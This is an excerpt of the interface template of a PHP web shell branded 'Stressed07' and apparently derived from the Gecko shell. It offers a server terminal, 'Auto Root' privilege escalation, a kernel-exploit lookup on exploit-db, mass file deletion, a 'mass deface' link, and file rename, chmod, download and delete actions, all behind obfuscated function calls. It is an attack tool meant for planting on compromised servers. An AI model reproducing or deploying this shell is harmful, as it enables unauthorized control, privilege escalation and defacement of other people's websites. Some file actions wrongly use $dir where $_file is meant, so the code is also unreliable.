...
<head>
    <meta charset="UTF-8">
    <title>$shell [ <?= $_SERVER['HTTP_HOST']; ?> ]</title>
...
<body>
    <div class="list-shell">
        <ul>
        	<li>Stressed07 [ <f1 class="fa-solid fa-bug"></f1><f1>&nbsp;Bypass Shell 403,404,500</f1> ]
            <li><?= $fungsi[11](); ?></li>
        ...
        <div class="tool-menu-header">
            <div class="list-tool">
                <ul class="tool-menu">
                	<li><a href='?' class=''><i class=''>&nbsp;home</a>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=terminal" class="">&nbsp;Terminal</a>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&action=root-terminal" class="">&nbsp;Auto Root</a>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=file" class="">&nbsp;Create File</a>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&create=folder" class="">&nbsp;Create Folder</a>
                    <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= linux_version(); ?>" class="">&nbsp;Localroot Suggester</a>
                    <li><a href="?dir=<?= hex($fungsi[9]()); ?>&backdoor=true" class="">&nbsp;Backdoor Destroyer</a>
                   <li><a href="https://github.com/MadExploits/Gecko/" class=""></i>&nbsp;mass deface</a>
                </ul>
            </div>
        </div>
        <br>
            ...
            <form action="" method="post">
                ...
                <div class="settings">
                    <select name="action-gecko" id="" class="action-gecko">
                    	<option value="delete">delete file massal</option>
                    <option value="unzio">unzip file massal<option>
                    </select>
                    <a> > </a><input type="submit" class="select-submit" value="Submit" name="gecko-submit">
                </div>
        </div>
                ...
                <?php foreach ($scdir as $dir) : ?>
                    <?php if ($fungsi[18]($dir)) : ?>
                        <tr>
                            ...
                            <td>
                                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $dir ?>">rename</i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $dir ?>">chmod</i></a>&nbsp;
                            </td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
                ...
                <?php foreach ($scdir as $_file) : ?>
                    <?php if ($fungsi[17]($_file)) : ?>
                        <tr>
                            ...
                            <td>
                               &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&rename=<?= $dir ?>">rename</i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&download=<?= $_file ?>">download</i></a>&nbsp;<a href="?dir=<?= hex($fungsi[9]()) ?>&chmod=<?= $_file ?>">chmod</i>&nbsp;</a><a href="?dir=<?= hex($fungsi[9]()) ?>&delete=<?= $dir ?>">delete</a>
                            </td>
                        </tr>
                    <?php endif; ?>
                <?php endforeach; ?>
